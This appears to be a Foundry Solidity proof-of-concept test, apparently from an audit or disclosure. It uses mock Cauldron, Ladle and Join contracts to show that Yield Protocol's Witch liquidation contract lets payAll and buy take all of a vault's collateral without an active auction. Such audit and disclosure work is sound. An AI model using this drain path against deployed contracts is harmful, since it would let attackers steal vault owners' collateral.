// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;

import "forge-std/Test.sol";
import {Witch} from "../src/vault/Witch.sol";
import {ICauldron} from "../src/vault/interfaces-package/ICauldron.sol";
import {ILadle} from "../src/vault/interfaces-package/ILadle.sol";
import {IJoin} from "../src/vault/interfaces-package/IJoin.sol";
import {DataTypes} from "../src/vault/interfaces-package/DataTypes.sol";
import {IOracle} from "../src/vault/interfaces-package/IOracle.sol";

/// @dev Boundary double for Yield's Join. The audited Witch still performs the
/// real `exit`/`join` settlement calls; the double records the amounts so the
/// test can prove that collateral left an inactive vault.
contract YieldJoinDouble {
    mapping(address => uint256) public exited;
    mapping(address => uint256) public joined;

    function asset() external pure returns (address) { return address(0); }

    function join(address user, uint128 wad) external returns (uint128) {
        joined[user] += wad;
        return wad;
    }

    function exit(address user, uint128 wad) external returns (uint128) {
        exited[user] += wad;
        return wad;
    }
}

/// @dev Only the Ladle call surface used by Witch.settle is needed here.
contract YieldLadleDouble {
    mapping(bytes6 => IJoin) internal _joins;

    function setJoin(bytes6 id, IJoin join_) external { _joins[id] = join_; }
    function joins(bytes6 id) external view returns (IJoin) { return _joins[id]; }
    function cauldron() external pure returns (ICauldron) { return ICauldron(address(0)); }
    function build(bytes6, bytes6, uint8) external pure returns (bytes12, DataTypes.Vault memory) {
        revert("unused");
    }
    function destroy(bytes12) external pure { revert("unused"); }
    function pour(bytes12, address, int128, int128) external pure { revert("unused"); }
    function close(bytes12, address, int128, int128) external pure { revert("unused"); }
}

/// @dev Protocol-boundary double. Vault and balance data are returned through
/// the same DataTypes structs as the historical Cauldron implementation.
contract YieldCauldronDouble {
    DataTypes.Vault internal _vault;
    DataTypes.Balances internal _balances;
    DataTypes.Series internal _series;

    function configure(
        address owner,
        bytes6 seriesId,
        bytes6 ilkId,
        bytes6 baseId,
        uint128 ink,
        uint128 art
    ) external {
        _vault = DataTypes.Vault(owner, seriesId, ilkId);
        _balances = DataTypes.Balances(art, ink);
        _series.baseId = baseId;
    }

    function lendingOracles(bytes6) external pure returns (IOracle) { return IOracle(address(0)); }
    function vaults(bytes12) external view returns (DataTypes.Vault memory) { return _vault; }
    function series(bytes6) external view returns (DataTypes.Series memory) { return _series; }
    function assets(bytes6) external pure returns (address) { return address(0); }
    function balances(bytes12) external view returns (DataTypes.Balances memory) { return _balances; }
    function debt(bytes6, bytes6) external pure returns (DataTypes.Debt memory) {
        return DataTypes.Debt(0, 0, 0, 0);
    }
    function build(address, bytes12, bytes6, bytes6) external pure returns (DataTypes.Vault memory) {
        revert("unused");
    }
    function destroy(bytes12) external pure { revert("unused"); }
    function tweak(bytes12, bytes6, bytes6) external pure returns (DataTypes.Vault memory) {
        revert("unused");
    }
    function give(bytes12, address receiver) external returns (DataTypes.Vault memory) {
        _vault.owner = receiver;
        return _vault;
    }
    function stir(bytes12, bytes12, uint128, uint128) external pure returns (DataTypes.Balances memory, DataTypes.Balances memory) {
        revert("unused");
    }
    function pour(bytes12, int128, int128) external pure returns (DataTypes.Balances memory) {
        revert("unused");
    }
    function roll(bytes12, bytes6, int128) external pure returns (DataTypes.Vault memory, DataTypes.Balances memory) {
        revert("unused");
    }
    function grab(bytes12, address) external pure { revert("unused"); }

    function slurp(bytes12, uint128 ink, uint128 art) external returns (DataTypes.Balances memory) {
        require(ink <= _balances.ink && art <= _balances.art, "overdraw");
        _balances.ink -= ink;
        _balances.art -= art;
        return _balances;
    }

    function debtFromBase(bytes6, uint128 base) external pure returns (uint128) { return base; }
    function debtToBase(bytes6, uint128 art) external pure returns (uint128) { return art; }
    function mature(bytes6) external pure {}
    function accrual(bytes6) external pure returns (uint256) { return 0; }
}

contract PoC_16980_YieldWitch is Test {
    bytes12 internal constant VAULT_ID = 0x000000000000000000000001;
    bytes6 internal constant SERIES_ID = 0x534552494553;
    bytes6 internal constant ILK_ID = 0x494c4b000000;
    bytes6 internal constant BASE_ID = 0x424153450000;

    YieldCauldronDouble internal cauldron;
    YieldLadleDouble internal ladle;
    YieldJoinDouble internal ilkJoin;
    YieldJoinDouble internal baseJoin;
    Witch internal witch;

    function setUp() public {
        cauldron = new YieldCauldronDouble();
        ladle = new YieldLadleDouble();
        ilkJoin = new YieldJoinDouble();
        baseJoin = new YieldJoinDouble();
        ladle.setJoin(ILK_ID, IJoin(address(ilkJoin)));
        ladle.setJoin(BASE_ID, IJoin(address(baseJoin)));
        cauldron.configure(address(0xB0B), SERIES_ID, ILK_ID, BASE_ID, 1_000, 400);

        witch = new Witch(ICauldron(address(cauldron)), ILadle(address(ladle)));
        // AccessControl grants ROOT to this test contract, but setIlk uses its
        // function selector as a separate role, exactly as production setup does.
        witch.grantRole(witch.setIlk.selector, address(this));
        witch.setIlk(ILK_ID, 1 days, 1e18, 0);
    }

    function testPayAllCanDrainVaultWithoutAuction() public {
        (, uint32 auctionStart) = witch.auctions(VAULT_ID);
        assertEq(auctionStart, 0, "fixture must be outside auction");

        uint256 ink = witch.payAll(VAULT_ID, 1_000);

        assertEq(ink, 1_000, "real Witch price path should buy all collateral");
        assertEq(ilkJoin.exited(address(this)), 1_000, "inactive vault collateral was not transferred");
        assertEq(baseJoin.joined(address(this)), 400, "real settle path was not reached");
        (,, uint128 remainingInk, uint128 remainingArt) = _readBalances();
        assertEq(remainingInk, 0);
        assertEq(remainingArt, 0);
    }

    function testBuyCanDrainVaultWithoutAuction() public {
        (, uint32 auctionStart) = witch.auctions(VAULT_ID);
        assertEq(auctionStart, 0, "fixture must be outside auction");

        uint256 ink = witch.buy(VAULT_ID, 400, 1_000);

        assertEq(ink, 1_000, "real Witch price path should buy all collateral");
        assertEq(ilkJoin.exited(address(this)), 1_000, "inactive vault collateral was not transferred");
        assertEq(baseJoin.joined(address(this)), 400, "buy path should settle the debt amount");
        (,, uint128 remainingInk, uint128 remainingArt) = _readBalances();
        assertEq(remainingInk, 0);
        assertEq(remainingArt, 0);
    }

    function _readBalances() internal view returns (bytes12, bytes6, uint128, uint128) {
        DataTypes.Balances memory b = cauldron.balances(VAULT_ID);
        return (VAULT_ID, SERIES_ID, b.ink, b.art);
    }
}
